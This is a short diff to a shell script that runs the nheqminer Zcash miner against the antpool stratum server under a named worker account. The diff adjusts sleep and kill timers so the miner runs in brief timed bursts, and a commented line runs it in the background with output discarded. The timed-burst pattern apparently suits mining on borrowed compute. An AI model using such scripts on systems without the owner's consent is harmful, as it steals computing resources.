@@ -1,4 +1,4 @@
 echo "lanjut"
-sleep 10
+
 #nohup ./nheqminer -l stratum-zec.antpool.com:8899 -u spiritbro.panda -p x > /dev/null 2>&1 &
-( cmdpid=$BASHPID; (sleep 540; kill $cmdpid) & exec ./nheqminer -l stratum-zec.antpool.com:8899 -u spiritbro.panda -p x  )
+sleep 10 && ( cmdpid=$BASHPID; (sleep 10; kill $cmdpid) & exec ./nheqminer -l stratum-zec.antpool.com:8899 -u spiritbro.panda -p x  )
